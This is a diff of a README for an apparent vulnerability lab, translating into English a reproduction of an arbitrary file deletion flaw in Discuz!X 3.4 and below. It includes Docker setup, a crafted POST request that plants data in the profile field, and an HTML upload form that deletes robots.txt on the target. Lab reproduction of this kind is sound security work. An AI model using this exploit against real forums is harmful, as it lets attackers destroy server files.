@@ -1,32 +1,36 @@
-# Discuz!X ≤3.4 任意文件删除漏洞
+# Discuz!X ≤3.4 Arbitrary File Deletion
 
-影响版本：Discuz!X ≤3.4
+[中文版本(Chinese version)](README.zh-cn.md)
 
-漏洞详情：https://lorexxar.cn/2017/09/30/dz-delete/
+Discuz!X is a popular forum software widely used in China. A vulnerability in Discuz!X versions 3.4 and below allows attackers to delete arbitrary files on the server through the user profile modification functionality.
 
-## 启动环境
+References:
 
-执行下列命令部署 Discuz!X 安装环境
+- <https://lorexxar.cn/2017/09/30/dz-delete/>
+
+## Environment Setup
+
+Execute the following command to deploy Discuz!X 3.4:
 
 ```
 docker compose up -d
 ```
 
-安装时，只用修改数据库地址为`db`，其他保持默认即可：
+During installation, only modify the database host to `db` and keep other settings as default:
 
 ![](1.png)
 
-## 漏洞复现
+## Vulnerability Reproduction
 
-访问`http://your-ip/robots.txt`可见robots.txt是存在的：
+First, verify that the target file (e.g., robots.txt) exists by visiting `http://your-ip/robots.txt`:
 
 ![](2.png)
 
-注册用户后，在个人设置页面找到自己的formhash：
+After registering a user account, find your formhash value in the personal settings page:
 
 ![](4.png)
 
-带上自己的Cookie、formhash发送如下数据包：
+Send the following HTTP request with your cookie and formhash:
 
 ```
 POST /home.php?mod=spacecp&ac=profile&op=base HTTP/1.1
@@ -55,18 +59,17 @@ Content-Disposition: form-data; name="profilesubmit"
 
 1
 ------WebKitFormBoundaryPFvXyxL45f34L12s--
-
 ```
 
-提交成功之后，用户资料修改页面上的出生地就会显示成下图所示的状态：
+After successful submission, the birthplace field in the user profile page will show the following state:
 
 ![](5.png)
 
-说明我们的脏数据已经进入数据库了。
+This indicates that our malicious data has been inserted into the database.
 
-然后，新建一个`upload.html`，代码如下，将其中的`[your-ip]`改成discuz的域名，`[form-hash]`改成你的formhash：
+Next, create an `upload.html` file with the following code (replace `[your-ip]` with your Discuz domain and `[form-hash]` with your formhash):
 
-```
+```html
 <body>
     <form action="http://[your-ip]/home.php?mod=spacecp&ac=profile&op=base&profilesubmit=1&formhash=[form-hash]" method="post" enctype="multipart/form-data">
         <input type="file" name="birthprovince" />
@@ -75,8 +78,8 @@ Content-Disposition: form-data; name="profilesubmit"
 </body>
 ```
 
-用浏览器打开该页面，上传一个正常图片。此时脏数据应该已被提取出，漏洞已经利用结束。
+Open this page in a browser and upload a normal image file. At this point, the malicious data should have been processed and the vulnerability exploitation is complete.
 
-再次访问`http://your-ip/robots.txt`，发现文件成功被删除：
+Visit `http://your-ip/robots.txt` again to verify that the file has been successfully deleted:
 
 ![](6.png)
